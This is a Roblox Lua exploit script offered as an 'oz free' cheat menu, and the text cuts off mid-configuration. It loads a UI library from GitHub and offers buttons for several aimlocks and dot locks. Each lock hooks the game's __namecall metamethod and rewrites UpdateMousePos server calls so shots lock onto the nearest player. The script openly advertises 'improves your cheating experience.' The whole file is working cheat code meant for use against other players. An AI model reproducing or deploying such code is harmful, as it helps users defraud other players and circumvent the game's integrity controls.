--•┃Loader┃•-- Completed


local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "oz free", HidePremium = false, SaveConfig = true, ConfigFolder = "Ozpriv"})
--•┃First boot ^^┃•-- Completed






--•┃Credits tab boot┃•-- Completed
local Main = Window:MakeTab({
	Name = "Credits",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local MainSec = Main:AddSection({
	Name = "Home"
})
MainSec:AddParagraph("INFO About this tab: This tab contains the scripts developers,", "and credits.")
MainSec:AddLabel("Welcome ozW User!")
MainSec:AddLabel("Credits:")
MainSec:AddLabel("This Script was made by oz#0003🔥")
MainSec:AddLabel("Developers:")
MainSec:AddLabel("Paws#2140🍌")
MainSec:AddLabel("M•e•l•o•d•y♪#3581🍑")
MainSec:AddLabel("devv#0016🥜")
MainSec:AddLabel("bloppity#0001🍿")
MainSec:AddLabel("Feel free to report bugs in our server")
MainSec:AddButton({
	Name = "Copy discord link",
	Callback = function()
	setclipboard("No discord found")
	end
})
local HomeSec = Main:AddSection({
	Name = "Updates",
})



HomeSec:AddLabel("V1.01 Updated Check updates in discord")
HomeSec:AddLabel("V1.0 Script release 3/1/2023 ")

--•┃Aim tab boot┃•-- Working Completed/Still adding things


local Aim = Window:MakeTab({
	Name = "Aimlock",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local AimSec = Aim:AddSection({
	Name = "Aimlock",
})
AimSec:AddLabel("Note = I DONT KNOW if any of these locks work.")
AimSec:AddParagraph("INFO About this tab: This tab contains aimlocks, which improves your cheating experience and your aiming experience.")


AimSec:AddButton({
	Name = "Blue Marker Lock",
	Callback = function()

	OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})
-- main aimlock settings
local configs = {
    main = {
        enabled = true,
        aimlockkey = "q",
        prediction = 0.1226781,
        aimpart = 'HumanoidRootPart', -- Head, UpperTorso, HumanoidRootPart, LowerTorso
        notifications = true
    }
}

-- box / marker settings

local boxsettings = {
    box = {
        Showbox = true,

        boxsize = Vector3.new(3.3, 3, 2.8), -- Box Size
        markercolor = Color3.fromRGB(1, 120, 145), -- Marrker Color
        markersize = UDim2.new(1, 0, 3, 0) -- Marker Size
    }
}

-- dont mess with anything below
local box = Instance.new("Part", game.Workspace)

local Mouse = game.Players.LocalPlayer:GetMouse()

function makemarker(Parent, Adornee, Color, Size, Size2)
    local box = Instance.new("BillboardGui", Parent)
    box.Name = "PRIVATE-REWRITE!"
    box.Adornee = Adornee
    box.Size = UDim2.new(Size, Size2, Size, Size2)
    box.AlwaysOnTop = true

    local a = Instance.new("Frame", box)
    a.Size = boxsettings.box.markersize
    a.BackgroundColor3 = Color

    local g = Instance.new("UICorner", a)
    g.CornerRadius = UDim.new(50, 25)
    return (box)
end

local Plr
Mouse.KeyDown:Connect(function(KeyPressed)
    if KeyPressed == (configs.main.aimlockkey) then
        if configs.main.enabled == true then
            configs.main.enabled = false
            if configs.main.notifications == true then
                Plr = FindClosestUser()
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Private",
                    Text = "Unlocked;"
                })
            end
        else
            Plr = FindClosestUser()
            configs.main.enabled = true
            if configs.main.notifications == true then
                game.StarterGui:SetCore("SendNotification", {
                    Title = "Private",
                    Text = "Locked On;  " .. tostring(Plr.Character.Humanoid.DisplayName)
                })
            end
        end
    end
end)

local data = game.Players:GetPlayers()
function noob(player)
    local character
    repeat
        wait()
    until player.Character
    local handler = makemarker(guimain, player.Character:WaitForChild(configs.main.aimpart),
        Color3.fromRGB(107, 184, 255), 0.10, 8)
    handler.Name = player.Name
    player.CharacterAdded:connect(function(Char)
        handler.Adornee = Char:WaitForChild("HumanoidRootPart")
    end)
end

for i = 1, #data do
    if data[i] ~= game.Players.LocalPlayer then
        noob(data[i])
    end
end

game.Players.PlayerAdded:connect(function(Player)
    noob(Player)
end)

spawn(function()
    box.Anchored = true
    box.CanCollide = false
    box.Size = boxsettings.box.boxsize
    if boxsettings.box.Showbox == true then
        box.Transparency = 0.70
    else
        box.Transparency = 1
    end
    makemarker(box, box, boxsettings.box.markercolor, 0.40, 1)
end)

function FindClosestUser()
    local closestPlayer
    local ShortestDistance = 300

    for i, v in pairs(game.Players:GetPlayers()) do
        if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and
            v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
            local pos = game:GetService "Workspace".CurrentCamera:WorldToViewportPoint(v.Character.PrimaryPart.Position)
            local magnitude = (Vector2.new(pos.X, pos.Y) -
                                  Vector2.new(game.Players.LocalPlayer:GetMouse().X,
                    game.Players.LocalPlayer:GetMouse().Y)).magnitude
            if magnitude < ShortestDistance then
                closestPlayer = v
                ShortestDistance = magnitude
            end
        end
    end
    return closestPlayer
end

game:GetService "RunService".Stepped:connect(function()
    if configs.main.enabled and Plr.Character and Plr.Character:FindFirstChild("HumanoidRootPart") then
        box.CFrame = CFrame.new(Plr.Character[configs.main.aimpart].Position +
                                    (Plr.Character.UpperTorso.Velocity * configs.main.prediction))
    else
        box.CFrame = CFrame.new(0, 9999, 0)
    end
end)

repeat
    wait()
until game:IsLoaded()
local mt = getrawmetatable(game)
local old = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(...)
    local args = {...}
    if configs.main.enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
        args[3] = Plr.Character[configs.main.aimpart].Position +
                      (Plr.Character[configs.main.aimpart].Velocity * configs.main.prediction)
        return old(unpack(args))
    end
    return old(...)
end)
  	end    
})
AimSec:AddButton({
	Name = "Black box lock",
	Callback = function()

		OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})
	-- Toggle key is Q
getgenv().Target = true
-- Configuration
getgenv().Key = Enum.KeyCode.Q
getgenv().Prediction = 0.130340
getgenv().ChatMode = false
getgenv().NotifMode = true
    getgenv().PartMode = true
    getgenv().AirshotFunccc = true
    getgenv().Partz = "LowerTorso"
getgenv().AutoPrediction = false
--
    _G.Types = {
        Ball = Enum.PartType.Ball,
        Block = Enum.PartType.Block, 
        Cylinder = Enum.PartType.Cylinder
    }
    
    --variables                 
        local Tracer = Instance.new("Part", game.Workspace)
    Tracer.Name = "gay" 
    Tracer.Anchored = true      
    Tracer.CanCollide = false
    Tracer.Transparency = 0.8
    Tracer.Parent = game.Workspace  
    Tracer.Shape = _G.Types.Block
    Tracer.Size = Vector3.new(14,14,14)
    Tracer.Color = Color3.fromRGB(16,0,22)
    
    --
    local plr = game.Players.LocalPlayer
local mouse = plr:GetMouse()
local Runserv = game:GetService("RunService")

circle = Drawing.new("Circle")
circle.Color = Color3.fromRGB(255,255,255)
circle.Thickness = 0
circle.NumSides = 732
circle.Radius = 732
circle.Thickness = 0
circle.Transparency = 0.9
circle.Visible = false
circle.Filled = false


Runserv.RenderStepped:Connect(function()
    circle.Position = Vector2.new(mouse.X,mouse.Y+35)
end)
    
        local guimain = Instance.new("Folder", game.CoreGui)
        local CC = game:GetService"Workspace".CurrentCamera
    local LocalMouse = game.Players.LocalPlayer:GetMouse()
        local Locking = false
    
        
    --
    if getgenv().valiansh == true then
                        game.StarterGui:SetCore("SendNotification", {
                        Title    = " <3 Chloe <37316's lock",
                        Text     = "loaded",
                        Duration = 1
        
                   })
        return
    end
    
    getgenv().valiansh = true
    
        local UserInputService = game:GetService("UserInputService")

    UserInputService.InputBegan:Connect(function(keygo,ok)
           if (not ok) then
           if (keygo.KeyCode == getgenv().Key) then
               if getgenv().Target == true then
               Locking = not Locking
               
               if Locking then
               Plr =  getClosestPlayerToCursor()
                if getgenv().ChatMode then
        local A_1 = "Target: "..tostring(Plr.Character.Humanoid.DisplayName) local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
            end 
               if getgenv().NotifMode then
                game.StarterGui:SetCore("SendNotification", {
        Title = "<3 Chloe <3#7316's Lock";
        Text = "Target: "..tostring(Plr.Character.Humanoid.DisplayName);
    
    })
    end
    elseif not Locking then
         if getgenv().ChatMode then
        local A_1 = "Unlocked!" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
            end 
        if getgenv().NotifMode then
                        game.StarterGui:SetCore("SendNotification", {
                        Title    = " <3 Chloe <3#7316's Lock",
                        Text     = "unlocked",
                        Duration = 1
               })
           elseif getgenv().Target == false then
                        game.StarterGui:SetCore("SendNotification", {
                        Title    = " lock",
                        Text     = "target isn't enabled",
                        Duration = 1
     
                   })
               
               end
                  
 
 end     end   
end
end
end)
    
    function getClosestPlayerToCursor()
        local closestPlayer
        local shortestDistance = circle.Radius

        for i, v in pairs(game.Players:GetPlayers()) do
            if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("LowerTorso") then
                local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
                if magnitude < shortestDistance then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
        return closestPlayer
    end
--
if getgenv().PartMode then
    game:GetService"RunService".Stepped:connect(function()
        if Locking and Plr.Character and Plr.Character:FindFirstChild("LowerTorso") then
            Tracer.CFrame = CFrame.new(Plr.Character.LowerTorso.Position+(Plr.Character.LowerTorso.Velocity*Prediction))
        else
            Tracer.CFrame = CFrame.new(0, 9999, 0)

        end
    end)
end

    
    
    --
    local rawmetatable = getrawmetatable(game)
    local old = rawmetatable.__namecall
    setreadonly(rawmetatable, false)
    rawmetatable.__namecall = newcclosure(function(...)
        local args = {...}
        if Locking and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
            args[3] = Plr.Character[getgenv().Partz].Position+(Plr.Character[getgenv().Partz].Velocity*Prediction)
            return old(unpack(args))
        end
        return old(...)
    end)


if getgenv().AirshotFunccc == true then

            if Plr.Character.Humanoid.Jump == true and Plr.Character.Humanoid.FloorMaterial == Enum.Material.Air then
                getgenv().Partz = "RightFoot"
            else
                Plr.Character:WaitForChild("Humanoid").StateChanged:Connect(function(old,new)
                    if new == Enum.HumanoidStateType.Freefall then
                    getgenv().Partz = "RightFoot"
                    else
                        getgenv().Partz = "LowerTorso"
                    end
                end)
            end
end
---
    while wait() do
    if getgenv().AutoPrediction == true then
        local pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
        local split = string.split(pingvalue,'(')
        local ping = tonumber(split[1])
        if ping < 130 then
            getgenv().Prediction = 0.151
        elseif ping < 125 then
            getgenv().Prediction = 0.149
        elseif ping < 110 then
            getgenv().Prediction = 0.146
        elseif ping < 105 then
            getgenv().Prediction = 0.138
        elseif ping < 90 then
            getgenv().Prediction = 0.136
        elseif ping < 80 then
            getgenv().Prediction = 0.134
        elseif ping < 70 then
            getgenv().Prediction = 0.131
        elseif ping < 60 then
            getgenv().Prediction = 0.1229
        elseif ping < 50 then
            getgenv().Prediction = 0.1225
        elseif ping < 40 then
            getgenv().Prediction = 0.1256
        end
    end
    end
		end
})
AimSec:AddButton({
	Name = "Tapped.lua (Q) ",
	Callback = function()
                   
				   	OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})
				   
				   
				   
				    --[[
					
					         $$\  $$\                                                   $$\ 
                            $$  | $$ |                                                  $$ |
    $$$$$$\   $$$$$$\      $$  /$$$$$$\    $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$\   $$$$$$$ |
   $$  __$$\ $$  __$$\    $$  / \_$$  _|   \____$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$ |
   $$ /  $$ |$$ /  $$ |  $$  /    $$ |     $$$$$$$ |$$ /  $$ |$$ /  $$ |$$$$$$$$ |$$ /  $$ |
   $$ |  $$ |$$ |  $$ | $$  /     $$ |$$\ $$  __$$ |$$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ |
$$\\$$$$$$$ |\$$$$$$$ |$$  /      \$$$$  |\$$$$$$$ |$$$$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$ |
\__|\____$$ | \____$$ |\__/        \____/  \_______|$$  ____/ $$  ____/  \_______| \_______|
   $$\   $$ |$$\   $$ |                             $$ |      $$ |                          
   \$$$$$$  |\$$$$$$  |                             $$ |      $$ |                          
    \______/  \______/                              \__|      \__|                          
Made By Xen#9999          
--]]
local CC = game:GetService'Workspace'.CurrentCamera
local Plr
local enabled = false
local accomidationfactor = 0.133
local mouse = game.Players.LocalPlayer:GetMouse()
local placemarker = Instance.new("Part", game.Workspace)
local guimain = Instance.new("Folder", game.CoreGui)
getgenv().Target = true 
getgenv().Key = Enum.KeyCode.Q
getgenv().NotifMode = true
function makemarker(Parent, Adornee, Color, Size, Size2)
    local e = Instance.new("BillboardGui", Parent)
    e.Name = "PP"
    e.Adornee = Adornee
    e.Size = UDim2.new(Size, Size2, Size, Size2)
    e.AlwaysOnTop = true
    local a = Instance.new("Frame", e)
    a.Size = UDim2.new(1, 0, 1, 0)
    a.BackgroundTransparency = 0.4
    a.BackgroundColor3 = Color
    local g = Instance.new("UICorner", a)
    g.CornerRadius = UDim.new(30, 30)
    return(e)
end

local data = game.Players:GetPlayers()
function noob(player)
    local character
    repeat wait() until player.Character
    local handler = makemarker(guimain, player.Character:WaitForChild("LowerTorso"), Color3.fromRGB(0, 76, 153), 0.0, 0)
    handler.Name = player.Name
    player.CharacterAdded:connect(function(Char) handler.Adornee = Char:WaitForChild("LowerTorso") end)
    
	local TextLabel = Instance.new("TextLabel", handler)
	TextLabel.BackgroundTransparency = 1
	TextLabel.Position = UDim2.new(0, 0, 0, -50)
	TextLabel.Size = UDim2.new(0, 100, 0, 100)
	TextLabel.Font = Enum.Font.SourceSansSemibold
	TextLabel.TextSize = 14
	TextLabel.TextColor3 = Color3.new(1, 1, 1)
	TextLabel.TextStrokeTransparency = 0
	TextLabel.TextYAlignment = Enum.TextYAlignment.Bottom
	TextLabel.Text = 'Name: '..player.Name
	TextLabel.ZIndex = 10
	
	spawn(function()
        while wait() do
            if player.Character then
                --TextLabel.Text = player.Name.." | Bounty: "..tostring(player:WaitForChild("leaderstats").Wanted.Value).." | "..tostring(math.floor(player.Character:WaitForChild("Humanoid").Health))
            end
        end
	end)
end

for i = 1, #data do
    if data[i] ~= game.Players.LocalPlayer then
        noob(data[i])
    end
end

game.Players.PlayerAdded:connect(function(Player)
    noob(Player)
end)

game.Players.PlayerRemoving:Connect(function(player)
    guimain[player.Name]:Destroy()
end)

spawn(function()
    placemarker.Anchored = true
    placemarker.CanCollide = false
    placemarker.Size = Vector3.new(7, 7, 7)
    placemarker.Transparency = 0.6
    makemarker(placemarker, placemarker, Color3.fromRGB(0, 0, 255), 0.55, 0)
end)    

mouse.KeyDown:Connect(function(k)
    if k ~= "q" then return end
    if enabled then
        enabled = false
       -- guimain[Plr.Name].Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    else
        enabled = true 
        Plr = getClosestPlayerToCursor()
        --guimain[Plr.Name].Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    end    
end)
local NotifyLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))()
local Notify = NotifyLibrary.Notify
    	local guimain = Instance.new("Folder", game.CoreGui)
    	local CC = game:GetService"Workspace".CurrentCamera
    local LocalMouse = game.Players.LocalPlayer:GetMouse()
    	local Locking = false

        local UserInputService = game:GetService("UserInputService")

    UserInputService.InputBegan:Connect(function(keygo,ok)
           if (not ok) then
           if (keygo.KeyCode == getgenv().Key) then
if getgenv().Target == true then
               Locking = not Locking
               if Locking then
               Plr =  getClosestPlayerToCursor()
if getgenv().NotifMode == true then
            Notify({
                Title = ".gg/tapped (made by xen#9999)",
                Description = "Locked Onto: ".."("..tostring(Plr.Character.Humanoid.DisplayName)..")",
                Duration = 3
            })
end
elseif not Locking then
    if Plr then Plr = nil
if getgenv().NotifMode == true then
            Notify({
                Title = ".gg/tapped (made by xen#9999)",
                Description = "Unlocked",
                Duration = 3
            })
end
end
end
end
end
end
end)
function getClosestPlayerToCursor()
    local closestPlayer
    local shortestDistance = math.huge

    for i, v in pairs(game.Players:GetPlayers()) do
        if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("Head") then
            local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
            local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
            if magnitude < shortestDistance then
                closestPlayer = v
                shortestDistance = magnitude
            end
        end
    end
   return closestPlayer
end

	game:GetService"RunService".Stepped:connect(function()
		if enabled and Plr.Character and Plr.Character:FindFirstChild("HumanoidRootPart") then
			placemarker.CFrame = CFrame.new(Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor))
		else
			placemarker.CFrame = CFrame.new(0, 9999, 0)
		end
	end)

	local mt = getrawmetatable(game)
	local old = mt.__namecall
	setreadonly(mt, false)
	mt.__namecall = newcclosure(function(...)
		local args = {...}
		if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
			args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor)
			return old(unpack(args))
		end
		return old(...)
	end)
		end
})
AimSec:AddButton({
	Name = "6AKAN box lock",
	Callback = function()

	OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})



local Settings = {
    rewrittenmain = {
        Enabled = true,
        Key = "q",
        DOT = true,
        AIRSHOT = true,
        NOTIF = true,
        AUTOPRED = true,
        FOV = math.huge,
        RESOVLER = true
    }
}
 
local SelectedPart = "LowerTorso"
local Prediction = true
local PredictionValue = 0.12467245219812
 
 
    local AnchorCount = 0
    local MaxAnchor = 50
 
    local CC = game:GetService"Workspace".CurrentCamera
    local Plr;
    local enabled = false
    local accomidationfactor = 0.1234772452176
    local mouse = game.Players.LocalPlayer:GetMouse()
    local placemarker = Instance.new("Part", game.Workspace)
 
    function makemarker(Parent, Adornee, Color, Size, Size2)
        local e = Instance.new("BillboardGui", Parent)
        e.Name = "PP"
        e.Adornee = Adornee
        e.Size = UDim2.new(Size, Size2, Size, Size2)
        e.AlwaysOnTop = Settings.rewrittenmain.DOT
        local a = Instance.new("Frame", e)
        if Settings.rewrittenmain.DOT == true then
        a.Size = UDim2.new(1, 0, 1, 0)
        else
        a.Size = UDim2.new(0, 0, 0, 0)
        end
        if Settings.rewrittenmain.DOT == true then
        a.Transparency = 0
        a.BackgroundTransparency = 0
        else
        a.Transparency = 1
        a.BackgroundTransparency = 1
        end
        a.BackgroundColor3 = Color
        local g = Instance.new("UICorner", a)
        if Settings.rewrittenmain.DOT == false then
        g.CornerRadius = UDim.new(0, 0)
        else
        g.CornerRadius = UDim.new(1, 1) 
        end
        return(e)
    end
 
 
    local data = game.Players:GetPlayers()
    function noob(player)
        local character
        repeat wait() until player.Character
        local handler = makemarker(guimain, player.Character:WaitForChild(SelectedPart), Color3.fromRGB(107, 184, 255), 0.3, 3)
        handler.Name = player.Name
        player.CharacterAdded:connect(function(Char) handler.Adornee = Char:WaitForChild(SelectedPart) end)
 
 
        spawn(function()
            while wait() do
                if player.Character then
                end
            end
        end)
    end
 
    for i = 1, #data do
        if data[i] ~= game.Players.LocalPlayer then
            noob(data[i])
        end
    end
 
    game.Players.PlayerAdded:connect(function(Player)
        noob(Player)
    end)
 
    spawn(function()
        placemarker.Anchored = true
        placemarker.CanCollide = false
        if Settings.rewrittenmain.DOT == true then
        placemarker.Size = Vector3.new(8, 8, 8)
        else
        placemarker.Size = Vector3.new(0, 0, 0)
        end
        placemarker.Transparency = 0.75
        if Settings.rewrittenmain.DOT then
        makemarker(placemarker, placemarker, Color3.fromRGB(232, 186, 200), 0.40, 0)
        end
    end)
 
    game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(k)
        if k == Settings.rewrittenmain.Key and Settings.rewrittenmain.Enabled then
            if enabled == true then
                enabled = false
                if Settings.rewrittenmain.NOTIF == true then
                    Plr = getClosestPlayerToCursor()
                game.StarterGui:SetCore("SendNotification", {
						Title = "6akan Locking Alert",
						Text = "Unlocked",
						Icon = "http://www.roblox.com/asset/?id=8850953349",
						Duration = 1,
})
            end
            else
                Plr = getClosestPlayerToCursor()
                enabled = true
                if Settings.rewrittenmain.NOTIF == true then
 
                    game.StarterGui:SetCore("SendNotification", {
						Title = "6akan Locking Alert",
						Text = "Locked on :"..tostring(Plr.Name);
						Icon = "http://www.roblox.com/asset/?id=8850953349",
						Duration = 1,
})
 
                end
            end
        end
    end)
 
 
 
    function getClosestPlayerToCursor()
        local closestPlayer
        local shortestDistance = Settings.rewrittenmain.FOV
 
        for i, v in pairs(game.Players:GetPlayers()) do
            if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("HumanoidRootPart") then
                local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(mouse.X, mouse.Y)).magnitude
                if magnitude < shortestDistance then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
        return closestPlayer
    end
 
    local pingvalue = nil;
    local split = nil;
    local ping = nil;
 
    game:GetService"RunService".Stepped:connect(function()
        if enabled and Plr.Character ~= nil and Plr.Character:FindFirstChild("HumanoidRootPart") then
            placemarker.CFrame = CFrame.new(Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor))
        else
            placemarker.CFrame = CFrame.new(0, 9999, 0)
        end
        if Settings.rewrittenmain.AUTOPRED == true then
             pingvalue = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
             split = string.split(pingvalue,'(')
             ping = tonumber(split[1])
            if ping < 130 then
                PredictionValue = 0.151
            elseif ping < 125 then
                PredictionValue = 0.149
            elseif ping < 110 then
                PredictionValue = 0.146
            elseif ping < 105 then
                PredictionValue = 0.138
            elseif ping < 90 then
                PredictionValue = 0.136
            elseif ping < 80 then
                PredictionValue = 0.134
            elseif ping < 70 then
                PredictionValue = 0.131
            elseif ping < 60 then
                PredictionValue = 0.1229
            elseif ping < 50 then
                PredictionValue = 0.1225
            elseif ping < 40 then
                PredictionValue = 0.1256
            end
        end
    end)
 
    local mt = getrawmetatable(game)
    local old = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(...)
        local args = {...}
        if enabled and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" and Settings.rewrittenmain.Enabled and Plr.Character ~= nil then
 
            -- args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*accomidationfactor)
            --[[
            if Settings.rewrittenmain.AIRSHOT == true then
                if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
 
                    --// Airshot
                    args[3] = Plr.Character.LeftFoot.Position+(Plr.Character.LeftFoot.Velocity*PredictionValue)
 
                else
                    args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)
 
                end
            else
                    args[3] = Plr.Character.HumanoidRootPart.Position+(Plr.Character.HumanoidRootPart.Velocity*PredictionValue)
            end
            ]]
            if Prediction == true then
 
            args[3] = Plr.Character[SelectedPart].Position+(Plr.Character[SelectedPart].Velocity*PredictionValue)
 
            else
 
            args[3] = Plr.Character[SelectedPart].Position
 
            end
 
            return old(unpack(args))
        end
        return old(...)
    end)
 
    game:GetService("RunService").RenderStepped:Connect(function()
        if Settings.rewrittenmain.RESOVLER == true and Plr.Character ~= nil and enabled and Settings.rewrittenmain.Enabled then
        if Settings.rewrittenmain.AIRSHOT == true and enabled and Plr.Character ~= nil then
 
            if game.Workspace.Players[Plr.Name].Humanoid:GetState() == Enum.HumanoidStateType.Freefall then -- Plr.Character:WaitForChild("Humanoid"):GetState() == Enum.HumanoidStateType.Freefall
 
                --// Airshot
 
                --// Anchor Check
 
                if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                    AnchorCount = AnchorCount + 1
                    if AnchorCount >= MaxAnchor then
                        Prediction = false
                        wait(2)
                        AnchorCount = 0;
                    end
                else
                    Prediction = true
                    AnchorCount = 0;
                end
 
                SelectedPart = "LeftFoot"
 
            else
                --// Anchor Check
 
                if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                    AnchorCount = AnchorCount + 1
                    if AnchorCount >= MaxAnchor then
                        Prediction = false
                        wait(2)
                        AnchorCount = 0;
                    end
                else
                    Prediction = true
                    AnchorCount = 0;
                end
 
                SelectedPart = "HumanoidRootPart"
 
            end
            else
 
                --// Anchor Check
 
                if Plr.Character ~= nil and Plr.Character.HumanoidRootPart.Anchored == true then
                    AnchorCount = AnchorCount + 1
                    if AnchorCount >= MaxAnchor then
                        Prediction = false
                        wait(2)
                        AnchorCount = 0;
                    end
                else
                    Prediction = true
                    AnchorCount = 0;
                end
 
                SelectedPart = "HumanoidRootPart"
            end
 
        else
                SelectedPart = "HumanoidRootPart"
        end
    end)
			end
})

--•┃Dot aiming tab┃•-- Working Completed/Still adding things



local Dot = Window:MakeTab({
	Name = "Dot locks",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local DotSec = Dot:AddSection({
	Name = "Dot Aiming"
})

DotSec:AddParagraph("INFO About this tab: This tab contains aimlocks, which improves your cheating experience and your aiming experience.")

DotSec:AddButton({
	Name = "Pink dot (Q)",
	Callback = function()
	
	OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})



	getgenv().Key = Enum.KeyCode.Q
getgenv().Prediction = 0.129
    getgenv().AirshotFunccc = false
    getgenv().Tracer = true
    getgenv().Partz = "HumanoidRootPart" -- LowerTorso, HumanoidRootPart,Head,UpperTorso    
        local Locking = false
    



local Tracer = Drawing.new("Circle")
Tracer.Visible = true
Tracer.Radius = 7
Tracer.Filled = true
Tracer.Color = Color3.fromRGB(255, 0, 212)
Tracer.Thickness = 1
Tracer.Transparency = 1

        

    function x(tt,tx,cc)
    game.StarterGui:SetCore("SendNotification", {
        Title = tt;
        Text = tx;
        Duration = cc;
    })
end

x("Yun", "Loaded", 3)


    if getgenv().flashyes == true then
                       x("Yun", "Already Loaded", 5)
        return
    end
    getgenv().flashyes = true
    
        local UserInputService = game:GetService("UserInputService")

    UserInputService.InputBegan:Connect(function(keygo,ok)
           if (not ok) then
           if (keygo.KeyCode == getgenv().Key) then
               Locking = not Locking
               if Locking then
               Plr =  getClosestPlayerToCursor()
                x("Yun", ""..Plr.Character.Humanoid.DisplayName, 3)
elseif not Locking then
    if Plr then Plr = nil
                       x("Yun", "Unlocked", 3)
     
         
end
end
end
end
end)
    function getClosestPlayerToCursor()
        local closestPlayer
        local shortestDistance = 137

        for i, v in pairs(game.Players:GetPlayers()) do
            if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("LowerTorso") then
                local pos = game:GetService"Workspace".CurrentCamera:WorldToViewportPoint(v.Character.PrimaryPart.Position)
                local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(game.Players.LocalPlayer:GetMouse().X, game.Players.LocalPlayer:GetMouse().Y)).magnitude
                if magnitude < shortestDistance then
                    closestPlayer = v
                    shortestDistance = magnitude
                end
            end
        end
        return closestPlayer
    end



    
    

    local rawmetatable = getrawmetatable(game)
    local old = rawmetatable.__namecall
    setreadonly(rawmetatable, false)
    rawmetatable.__namecall = newcclosure(function(...)
        local args = {...}
        if Plr ~= nil  and getnamecallmethod() == "FireServer" and args[2] == "UpdateMousePos" then
            args[3] = Plr.Character[getgenv().Partz].Position+(Plr.Character[getgenv().Partz].Velocity*Prediction)
            return old(unpack(args))
        end
        return old(...)
    end)


game:GetService("RunService").RenderStepped:connect(function()    
if getgenv().AirshotFunccc == true then

            if Plr ~= nil and Plr.Character.Humanoid.FloorMaterial == Enum.Material.Air then
                getgenv().Partz = "RightFoot"
            else
               
                        getgenv().Partz = "LowerTorso"
            end
end
         

        if getgenv().Tracer == true and Locking then
            local Vector, OnScreen = game:GetService"Workspace".CurrentCamera:worldToViewportPoint(Plr.Character[getgenv().Partz].Position+(Plr.Character[getgenv().Partz].Velocity*Prediction))
            Tracer.Visible = true
   Tracer.Position = Vector2.new(Vector.X, Vector.Y)
        else
            Tracer.Visible = false
        end
    

    end)
		end
})
DotSec:AddButton({
	Name = "Purple dot (Q)",
	Callback = function()

	OrionLib:MakeNotification({
	Name = "Injected successfully!",
	Content = "Injected script.",
	Image = "rbxassetid://4483345998",
	Time = 3
})





local settings = {
    main = {
        DotEnabled = true, -- leave this true thusky pooh ;)
        Prediction = 0.135,
        Part = "HumanoidRootPart",
        Key = "q",
        Notifications = true,
        AirshotFunc = true
    },
    Dot = {
        Show = true,
